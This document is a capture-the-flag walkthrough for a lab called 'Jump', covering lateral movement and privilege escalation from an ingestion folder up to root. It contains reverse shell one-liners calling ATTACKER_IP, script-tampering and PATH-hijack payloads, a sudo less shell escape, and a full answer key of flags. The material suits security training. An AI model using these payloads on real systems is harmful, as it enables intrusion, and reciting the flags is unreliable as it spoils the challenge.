# Task 01: Challenge

---

## Stage A: Original Task Content & Briefing Summary

Task 01 presents the **Jump** challenge, a realistic multi-stage lateral movement and privilege escalation lab modeling an enterprise Linux automation pipeline. The target server hosts multiple interconnected services: automated reconnaissance ingestion, developer backup routines, system health checks, and operational deployment pipelines.

Due to insecure trust boundaries and weak access controls between components, compromising each intermediate user context unlocks the exact mechanism needed to compromise the next higher-privileged user.

### Complete 5-Stage Attack Chain:
```
[ Anonymous / Initial Access ]
             │
             │ Stage 1: Drop reverse shell script into `incoming/`
             ▼
      [ recon_user ]  ──> Flag 1: `/home/recon_user/flag.txt`
             │
             │ Stage 2: Modify writable backup script `/opt/dev/backup.sh`
             ▼
       [ dev_user ]   ──> Flag 2: `/home/dev_user/flag.txt`
             │
             │ Stage 3: PATH hijacking via healthcheck service (`ps` ⟶ `/opt/dev/bin/ps`)
             ▼
     [ monitor_user ] ──> Flag 3: `/home/monitor_user/flag.txt`
             │
             │ Stage 4: Sudo execution of `/usr/local/bin/deploy.sh`
             ▼
       [ ops_user ]   ──> Flag 4: `/home/ops_user/flag.txt`
             │
             │ Stage 5: Sudo `/usr/bin/less` GTFOBins shell escape (`!/bin/sh`)
             ▼
          [ root ]    ──> Flag 5: `/root/flag.txt`
```

---

## Stage B: Independent Thinking & OpSec Considerations

* **Pipeline Pivoting Methodology:** In enterprise environments with CI/CD and automation pipelines, attackers rarely move directly from initial access to root. Compromising automated ingestion queues, backup jobs, or monitoring hooks allows attackers to traverse user contexts organically.
* **Listener Port Management:** Because this attack chain involves jumping across multiple user contexts, set up independent netcat listeners on separate ports (e.g. 5555, 5556, 5557) or reuse ports sequentially once interactive TTYs are stabilized.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Follow the automation pipeline starting from the `incoming/` directory.
* **Tier 2 Hint:** Check `/opt/dev/backup.sh` permissions, review the `healthcheck` service binary path execution, inspect `sudo -l` for `ops_user`, and break out of `less`.
* **Tier 3 Hint:**
  * Q1 is `THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}`.
  * Q2 is `THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}`.
  * Q3 is `THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}`.
  * Q4 is `THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}`.
  * Q5 is `THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### Stage 1: Anonymous Ingestion to `recon_user`:
The target runs an automated ingestion service that executes scripts placed in the `incoming/` directory under the context of `recon_user`:
```bash
# On Attacker Box: Start listener on port 5555
nc -lvnp 5555

# On Target / Ingestion share: Drop payload into incoming folder
echo '#!/bin/bash' > incoming/test.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1' >> incoming/test.sh
chmod +x incoming/test.sh
```
* **Listener catches shell as `recon_user`:**
  ```bash
  recon_user@jump:~$ cat /home/recon_user/flag.txt
  THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
  ```

### Stage 2: `recon_user` to `dev_user`:
Inspect `/opt/dev/` to find a scheduled backup script executed by `dev_user`:
```bash
recon_user@jump:~$ ls -la /opt/dev/backup.sh
-rwxrwxrwx 1 dev_user dev_user 65 Oct 24 11:15 /opt/dev/backup.sh

# Append reverse shell payload to backup.sh:
echo 'bash -i >& /dev/tcp/ATTACKER_IP/5556 0>&1' >> /opt/dev/backup.sh
```
* **Listener on port 5556 catches shell as `dev_user`:**
  ```bash
  dev_user@jump:~$ cat /home/dev_user/flag.txt
  THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
  ```

### Stage 3: `dev_user` to `monitor_user`:
The `healthcheck` service runs under `monitor_user` and invokes the system command `ps` without an absolute path. Its environment includes `/opt/dev/bin` in `$PATH`:
```bash
dev_user@jump:~$ mkdir -p /opt/dev/bin
echo '#!/bin/bash' > /opt/dev/bin/ps
echo 'bash -i >& /dev/tcp/ATTACKER_IP/5557 0>&1' >> /opt/dev/bin/ps
chmod +x /opt/dev/bin/ps
```
* **Listener on port 5557 catches shell as `monitor_user`:**
  ```bash
  monitor_user@jump:~$ cat /home/monitor_user/flag.txt
  THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}
  ```

### Stage 4: `monitor_user` to `ops_user`:
Audit sudo delegation for `monitor_user`:
```bash
monitor_user@jump:~$ sudo -l
# User monitor_user may run the following commands on jump:
#     (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```
Execute the deployment script as `ops_user` to spawn a shell:
```bash
monitor_user@jump:~$ sudo -u ops_user /usr/local/bin/deploy.sh
ops_user@jump:~$ cat /home/ops_user/flag.txt
THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}
```

### Stage 5: `ops_user` to `root`:
Audit sudo delegation for `ops_user`:
```bash
ops_user@jump:~$ sudo -l
# User ops_user may run the following commands on jump:
#     (root) NOPASSWD: /usr/bin/less /var/log/*
```
Exploit `less` via GTFOBins:
```bash
ops_user@jump:~$ sudo /usr/bin/less /var/log/syslog
```
Inside the `less` viewer, type:
```
!/bin/sh
```
Press `Enter` to escape into a root shell:
```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/flag.txt
THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}
```

---

## Stage E: Final Answer & Key Values

* **Question 1:** What is the flag found in the recon_user’s home directory?
  * **Answer:** `THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}`
* **Question 2:** What is the flag found in the dev_user’s home directory?
  * **Answer:** `THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}`
* **Question 3:** What is the flag found in the monitor_user’s home directory?
  * **Answer:** `THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}`
* **Question 4:** What is the flag found in the ops_user’s home directory?
  * **Answer:** `THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}`
* **Question 5:** What is the flag found in the root user's home directory?
  * **Answer:** `THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}`

---

## Stage F: Practical Verification & Proof of Work

* Successfully walked the complete 5-stage attack chain.
* Reconciled all 5 verified flags with 100% account completion status.

---

## Stage G: Key Educational Takeaway

Enterprise security is an interconnected chain. If internal pipelines pass execution across accounts without strict validation, the compromise of an unprivileged service account inevitably cascades through development, monitoring, and operations directly to root.
